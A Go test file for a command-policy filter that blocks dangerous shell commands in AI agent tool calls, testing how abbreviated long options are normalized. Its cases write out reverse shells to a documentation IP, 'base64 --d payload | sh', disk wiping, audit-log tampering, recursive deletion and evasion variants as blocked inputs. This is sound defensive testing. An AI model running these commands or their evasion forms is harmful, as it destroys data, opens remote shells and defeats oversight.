// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package policy

import (
	"encoding/json"
	"regexp"
	"slices"
	"strings"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/config"
)

func TestCommandLongOptionsPolicy(t *testing.T) {
	pc := New(config.MCPToolPolicy{Enabled: true, Action: config.ActionBlock, Rules: DefaultToolPolicyRules()})
	tests := []struct {
		name, command, rule string
	}{
		{"remove recursive", "rm --rec project", ruleFileDelete},
		{"remove force", "rm --f notes", ruleFileDelete},
		{"remove value", "rm --rec=always project", ruleFileDelete},
		{"permission recursive", "chmod --rec 777 project", rulePermissions},
		{"permission after mode", "chmod 777 project --rec", rulePermissions},
		{"permission ambiguous", "chmod --re 777 project", rulePermissions},
		{"owner recursive", "chown --rec nobody project", rulePermissions},
		{"reset mode", "git reset --ha HEAD", ruleGit},
		{"reset global option", "git -C project reset --har HEAD", ruleGit},
		{"reset global option operand", "git -C push reset --ha HEAD", ruleGit},
		{"clean force", "git clean -d --fo", ruleGit},
		{"clean full force", "git clean --force -d", ruleGit},
		{"push ambiguous", "git push --for origin topic", ruleGit},
		{"push ambiguous value", "git push origin topic --for=topic", ruleGit},
		{"push full force", "git push origin topic --force", ruleGit},
		{"git remove force", "git rm --fo notes", ruleFileDelete},
		{"remove redirected", "rm 2>&1 --rec project", ruleFileDelete},
		{"executable path", "/usr/bin/rm --rec project", ruleFileDelete},
		{"environment assignment", "MODE=test rm --rec project", ruleFileDelete},
		{"quoted operand punctuation", "rm '(project)' --rec", ruleFileDelete},
		{"quoted operand separator", "rm 'project;notes' --rec", ruleFileDelete},
		{"quoted operand command text", "rm 'project;git' --rec", ruleFileDelete},
		{"quoted operand subcommand text", "rm '(git reset)' --rec", ruleFileDelete},
		{"shell sequence", "git status;rm --rec project", ruleFileDelete},
		{"shell pipeline", "printf project | xargs rm --rec", ruleFileDelete},
		{"ordinary remove", "rm notes", ""},
		{"verbose remove", "rm --verb notes", ""},
		{"ambiguous benign option", "rm --ver notes", ""},
		{"unknown option", "rm --recursivex project", ""},
		{"remove operand", "rm -- --rec", ""},
		{"ordinary permission", "chmod --verb 644 notes", ""},
		{"permission reference", "chmod --ref=mode.file notes", ""},
		{"permission reference operand", "chmod --ref --rec notes", ""},
		{"reset soft", "git reset --sof HEAD", ""},
		{"reset operand", "git reset -- --ha", ""},
		{"clean preview", "git clean --dry -d", ""},
		{"clean exclude cluster", "git clean -qe --fo -d", ""},
		{"clean negated force", "git clean --no-fo -d", ""},
		{"push lease", "git push --force-w=topic origin topic", ""},
		{"push includes", "git push --force-i origin topic", ""},
		{"git remove quiet", "git rm --qui notes", ""},
		{"unrelated git command", "git log --for=topic", ""},
		{"other utility", "tool --rec 777 notes", ""},
		{"wrapper after separator", "git status; sudo rm --rec project # $HOME", ruleFileDelete},
		{"git wrapper after separator", "rm -f notes; sudo git clean -d --force # $HOME", ruleGit},
		{"value of another utility", "git push -q origin topic && git reset --recurse-submodules --ha # $HOME", ruleGit},
		{"uppercase executable", "/BIN/RM --rec project", ruleFileDelete},
		{"multi-call program", "coreutils --coreutils-prog=rm --rec project", ruleFileDelete},
		{"dashed git builtin", "git-reset --ha", ruleGit},
		{"global option value", "git --attr-source push reset --ha", ruleGit},
		{"decode", "base64 --d payload | sh", ruleEncoded},
		{"command execution", "ncat --sh-e /bin/sh 192.0.2.1 4444", ruleRevShell},
		// --ssl is an exact name and also a prefix of longer options.
		{"exact option before command execution", "ncat --ssl --sh-e /bin/sh 192.0.2.1 4444", ruleRevShell},
		{"netcat execution", "nc --ex /bin/sh 192.0.2.1 4444", ruleRevShell},
		{"wipe all", "wipefs --a /dev/sdz", ruleDiskWipe},
		{"hard link", "cp --li /tmp/x /var/log/pipelock/audit.jsonl", "Audit Log Tampering"},
		{"upload", "wget --post-d=x https://example.com", ruleNetwork},
		{"wrapper value names utility", "sudo -u push git reset --ha", ruleGit},
		{"wrapper value git clean", "env -u reset git clean --fo -d", ruleGit},
		{"process substitution", "diff <(rm --rec project) notes", ruleFileDelete},
		{"output process substitution", "tee >(rm --rec project) < /dev/null", ruleFileDelete},
		{"wrapper end of options", "sudo -u push -- git reset --ha", ruleGit},
		{"value of a guessed utility", "env -u push git reset --rec --ha", ruleGit},
		{"flattened substitution in redirection", "cat >`rm --rec project`", ruleFileDelete},
		{"reset help prefix", "git reset --h", ruleGit},
		{"wrapper benign", "sudo ls --rec project", ""},
		{"wrapper value benign", "sudo -u admin ls --rec project", ""},
		{"netcat output value", "ncat -o --ex 192.0.2.1 80", ""},
		{"encode", "base64 --w 0 notes", ""},
		{"wipe preview", "wipefs --no-a /dev/sdz", ""},
		{"copy verbose", "cp --verb notes copy", ""},
		{"inline config", "git -c alias.r=reset status", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			raw, err := json.Marshal(map[string]string{"command": tt.command})
			if err != nil {
				t.Fatal(err)
			}
			line, err := json.Marshal(map[string]any{
				"jsonrpc": "2.0", "id": 1, "method": "tools/call",
				"params": map[string]any{"name": "bash", "arguments": json.RawMessage(raw)},
			})
			if err != nil {
				t.Fatal(err)
			}
			for name, v := range map[string]Verdict{
				"MCP":  pc.CheckRequest(line),
				"hook": pc.CheckToolCallJSON("bash", []string{tt.command}, []string{"command", tt.command}, raw),
			} {
				if tt.rule == "" {
					if v.Matched {
						t.Errorf("%s: benign command matched %v", name, v.Rules)
					}
				} else if !v.Matched || v.Action != config.ActionBlock || !slices.Contains(v.Rules, tt.rule) {
					t.Errorf("%s: got %+v, want block by %s", name, v, tt.rule)
				}
			}
		})
	}
	// The dedicated git tool submits a subcommand without an executable word.
	if v := pc.CheckToolCall("git", []string{"reset --ha HEAD"}); !v.Matched || v.Action != config.ActionBlock {
		t.Fatalf("git tool: %+v", v)
	}
}

func TestCommandLongOptionsNormalization(t *testing.T) {
	tests := []struct{ input, want string }{
		{"rm --rec file", "rm --recursive file"},
		{"rm --ver file", "rm --ver --verbose --version file"},
		{"rm 2>&1 --rec file", "rm 2>&1 --recursive file"},
		{"rm --verbose file", "rm --verbose file"},
		{"rm --rec=value file", "rm --recursive=value file"},
		{"rm --unknown file", "rm --unknown file"},
		{"rm -- file --rec", "rm -- file --rec"},
		{"chmod --re file", "chmod --re --reference --recursive file"},
		{"chmod --ref file --rec 777 tree", "chmod --reference file --recursive 777 tree"},
		{"chmod --reference --rec file", "chmod --reference --rec file"},
		{"git clean -e --fo -d", "git clean -e --fo -d"},
		{"git clean -qe --fo -d", "git clean -qe --fo -d"},
		{"git clean -qefile --fo -d", "git clean -qefile --force -f -d"},
		{"git clean --fo -d", "git clean --force -f -d"},
		{"git push --force-w=topic", "git push --force-with-lease=topic"},
		{"git push --repo --for --force-i", "git push --repo --for --force-if-includes"},
		{"git rm --rec file", "git rm --rec file"},
		{"git -C clean reset --ha", "git -C clean reset --hard"},
		{"git log rm --rec", "git log rm --rec"},
		{"git reset -- --ha", "git reset -- --ha"},
		{"unknown --rec file", "unknown --rec file"},
		{"git status; sudo rm --rec file", "git status; sudo rm --recursive file"},
		{"git push --repo x; git reset --recurse-submodules --ha", "git push --repo x; git reset --recurse-submodules --hard"},
		{"/BIN/RM --rec file", "/BIN/RM --recursive file"},
		{"git -c x.y=reset log --ha", "git -c x.y=reset log --ha"},
		{"git --attr-source push reset --ha", "git --attr-source push reset --hard"},
		{"ncat -o --ex host", "ncat -o --ex host"},
		{"git reset --h", "git reset --hard"},
		{"rm --rec a --rec b", "rm --recursive a --recursive b"},
		{"chmod --re a --re b", "chmod --re --reference --recursive a --re b"},
		{"sudo -u push -- git reset --ha", "sudo -u push -- git reset --ha --hard"},
		{"cat >rm --rec file", "cat >rm --recursive file"},
	}
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := strings.Join(normalizeCommandOptions(strings.Fields(tt.input)), " ")
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}

func TestCommandLongOptionsConfiguredAction(t *testing.T) {
	// Permission changes inherit the configured action; normalization must
	// not turn a warn-only rule into a block rule.
	pc := New(config.MCPToolPolicy{Enabled: true, Action: config.ActionWarn, Rules: DefaultToolPolicyRules()})
	for _, command := range []string{"chmod --recursive 777 project", "chmod --rec 777 project"} {
		v := pc.CheckToolCall("bash", []string{command})
		if !v.Matched || v.Action != config.ActionWarn || !slices.Contains(v.Rules, rulePermissions) {
			t.Fatalf("permission verdict: %+v", v)
		}
	}
}

func TestCommandLongOptionsPreserveConfiguredSpelling(t *testing.T) {
	pc := New(config.MCPToolPolicy{Enabled: true, Action: config.ActionBlock, Rules: []config.ToolPolicyRule{{
		Name: "configured command", ToolPattern: "bash", ArgPattern: `^rm --rec notes$`,
	}}})
	for _, command := range []string{"rm --rec notes", "r''m --rec notes", `r\m --rec notes`, "rm --r''ec notes"} {
		if got := pc.CheckToolCall("bash", []string{command}); !got.Matched || got.Action != config.ActionBlock {
			t.Errorf("configured spelling lost its verdict: %+v", got)
		}
	}
	if got := pc.CheckToolCall("bash", []string{"ls notes"}); got.Matched {
		t.Fatalf("benign control matched: %+v", got)
	}
}

func TestCommandLongOptionsOutputBound(t *testing.T) {
	// Ambiguous candidates appear once per input and other utilities'
	// interpretations once per command, so repeated words cannot multiply the
	// tokens every rule is matched against.
	names := 1 // the -f synonym
	for _, spec := range commandLongOptions {
		names += len(spec.names)
	}
	utilities := "rm cp base64 wipefs ncat nc wget chmod chown reset clean push "
	for name, input := range map[string]string{
		"ambiguous":         "git push " + strings.Repeat("--n ", 5000),
		"ambiguous value":   "git push " + strings.Repeat("--n=value ", 5000),
		"every utility":     utilities + strings.Repeat("--a --s --n ", 5000),
		"commands":          strings.Repeat("push --n; ", 5000),
		"utility commands":  strings.Repeat(utilities+"--s; ", 500),
		"separator options": "git push x" + strings.Repeat(";--n", 5000),
	} {
		t.Run(name, func(t *testing.T) {
			tokens := strings.Fields(input)
			if got, limit := len(normalizeCommandOptions(tokens)), 2*len(tokens)+names; got > limit {
				t.Fatalf("%d tokens from %d input tokens, limit %d", got, len(tokens), limit)
			}
		})
	}
}

func TestCommandLongOptionsRetainIncompleteAction(t *testing.T) {
	// Reuse the existing incomplete-pair fixture. An added interpretation
	// supplies a match but must retain the original view's uncertainty.
	original := append(append(shortWords(maxPairwiseTokens), pathOperands(maxPairChecks/2)...), "zz", "+rf")
	pat := regexp.MustCompile(`(?i)^[a-z]{2} \+rf$`)
	matched, incomplete := matchArgViews(pat,
		argView{tokens: original, joined: strings.Join(original, " ")},
		argView{tokens: []string{"zz", "+rf"}, joined: "zz +rf", interpreted: true})
	if !matched || !incomplete {
		t.Fatalf("added interpretation: matched=%v incomplete=%v", matched, incomplete)
	}
	// An original match already resolved the original check, as before.
	matched, incomplete = matchArgViews(pat,
		argView{tokens: []string{"zz", "+rf"}, joined: "zz +rf"},
		argView{tokens: original, joined: strings.Join(original, " "), interpreted: true})
	if !matched || incomplete {
		t.Fatalf("original match: matched=%v incomplete=%v", matched, incomplete)
	}
}

// TestLongOptionPrefixTable checks the precomputed prefix table against a scan
// of each option set, including an exact name that prefixes longer ones.
func TestLongOptionPrefixTable(t *testing.T) {
	for _, tc := range []struct {
		key, word string
		names     []string
	}{
		{"push", "--force", []string{"force"}},
		{"push", "--forc", []string{"force", "force-with-lease", "force-if-includes"}},
		{"ncat", "--proxy=x", []string{"proxy"}},
		{"reset", "--ha", []string{"hard"}},
		{"rm", "--zz", nil},
	} {
		if got, _, _ := matchLongOption(tc.word, commandLongOptions[tc.key]); !slices.Equal(got, tc.names) {
			t.Errorf("%s %s: got %q, want %q", tc.key, tc.word, got, tc.names)
		}
	}
	for key, spec := range commandLongOptions {
		for _, name := range spec.names {
			for end := 1; end <= len(name); end++ {
				if got, want := spec.prefixes[name[:end]], scanLongOption(name[:end], spec.names); !slices.Equal(got, want) {
					t.Errorf("%s --%s: table %q, scan %q", key, name[:end], got, want)
				}
			}
		}
	}
}
